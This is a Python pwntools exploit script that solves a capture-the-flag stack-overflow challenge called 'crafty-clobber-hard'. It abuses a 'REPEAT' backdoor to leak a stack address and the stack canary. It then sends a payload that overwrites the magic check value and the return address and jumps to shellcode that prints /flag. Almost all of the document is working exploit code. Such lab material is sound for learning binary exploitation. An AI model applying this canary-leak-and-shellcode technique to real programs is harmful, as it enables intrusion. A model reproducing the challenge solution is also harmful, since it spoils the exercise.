from pwn import *

'''
like canary conundrum but with this diff:
```
 printf("You said: %s\n", (const char *)buf);
  if ( strstr((const char *)buf, "REPEAT") )
  {
    puts("Backdoor triggered! Repeating challenge()");
    return sub_1E7B(a1, a2, a3);
  }
  else
  {
    puts("Goodbye!");
    if ( buf_1[13] != 0x4D51E080645305B7LL )
    {
      puts("exit() condition triggered. Exiting!");
      exit(42);
    }
    puts("exit() condition avoided! Continuing execution.");
    return 0;
  }
```
'''

context.binary = elf = ELF('/challenge/crafty-clobber-hard')

io = elf.process()

magic_code = 0x4D51E080645305B7
magic_buffer_offset = 0x68
stackleak_buffer_offset = magic_buffer_offset + 0x18
canary_buffer_offset = magic_buffer_offset + 0x10
shellcode_buffer_offset = 0x10c0 + 0xd0 + 0xd0
sip_buffer_offset = magic_buffer_offset + 0x20

backdoor_trigger = b'REPEAT'
sc = asm(shellcraft.cat('/flag'))
shellcode_buffer_offset2 = shellcode_buffer_offset + len(sc)

io.sendline(str(stackleak_buffer_offset).encode())
io.sendline(backdoor_trigger + b'A' * (stackleak_buffer_offset - len(backdoor_trigger)))
io.recvuntil(b'A' * (stackleak_buffer_offset - len(backdoor_trigger)))
stack_leak = u64(io.recvline(keepends=False).ljust(8, b'\x00'))
print(f'[=] stack leak: {hex(stack_leak)}')

io.sendline(str(canary_buffer_offset + 1).encode())
io.sendline(backdoor_trigger + b'A' * (canary_buffer_offset + 1 - len(backdoor_trigger)))
io.recvuntil(b'A' * (canary_buffer_offset + 1 - len(backdoor_trigger)))
canary = u64(io.recvn(7).rjust(8, b'\x00')) # NOTE: must call with recvn() cause rbp behand canary and the most significant byte is not \x00
print(f'[=] canary: {hex(canary)}')

io.sendline(str(shellcode_buffer_offset2).encode())
payload = b'A' * magic_buffer_offset + p64(magic_code) + b'B' * 8 + p64(canary) + b'C' * 8 + p64(stack_leak) + b'D' * (shellcode_buffer_offset - sip_buffer_offset - 8) + sc
assert len(payload) == shellcode_buffer_offset2
io.sendline(payload)

io.interactive()
